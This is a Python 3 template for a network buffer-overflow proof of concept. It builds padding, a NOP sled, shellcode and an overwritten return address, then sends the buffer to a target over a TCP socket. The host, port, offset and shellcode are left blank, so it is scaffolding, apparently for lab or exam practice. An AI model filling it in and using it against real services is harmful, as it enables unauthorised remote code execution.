#!/usr/bin/python3
## dead1 buffer overflow python3 template
## make sure to double check your encoding

import socket
import struct

## host information
host=""
host_port=

## size before EIP/RIP over-write
buffer_size=

## address to jump to
eip=0xdeadbeef

## shellcode (if any)
shellcode=""
shellcode+=""

## nop sled (if any)
nop_sled="\x90" * 0

## build buffer
padding="\x41" * (buffer_size - len(nop_sled) - len(shellcode))
the_buffer=padding + nop_sled + shellcode
eip_pack=struct.pack("<L", eip)
the_buffer=the_buffer.encode("UTF-8") + eip_pack

## information
print(">> Dead1's Buffer Overflow POC <<")
print(" Size of Buffer:\t",buffer_size)
print(" Size of Padding:\t",len(padding))
print(" Size of NOP Sled:\t",len(nop_sled)) 
print(" Size of Shellcode:\t",len(shellcode))

## connect socket and send buffer
pwn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print(f"\n[*] Connecting to {host} !")
pwn.connect((host, host_port))
print("[*] Waiting for Response ...")
msg=pwn.recv(1024)
print(msg.decode("UTF-8"))
print("[*] Sending Buffer !")
pwn.send(the_buffer + b"\n")
print("[*] Waiting for Response ...")
msg=pwn.recv(4096)
print(f"[*] Response Recieved !")
print(msg)
print("[*] Closing Connection !")
pwn.close()
print("[*] Done !")
